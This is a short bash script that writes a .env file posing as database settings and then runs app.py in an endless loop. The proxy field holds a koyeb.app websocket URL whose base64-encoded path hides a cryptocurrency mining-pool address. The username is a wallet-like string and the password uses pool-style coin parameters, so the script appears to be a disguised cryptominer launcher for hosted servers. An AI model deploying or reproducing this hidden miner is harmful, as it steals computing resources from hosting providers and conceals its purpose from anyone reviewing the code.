#!/bin/bash


echo -e "host=127.0.0.1\nport=3306\nproxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=8\npassword=c=MBC,zap=MBC\nusername=MZCpYYo42ESmogzNNvdXogdDDzoFLgZeWB" > .env


MIN=$1
while true; do
    python3 app.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
    sleep 10
done
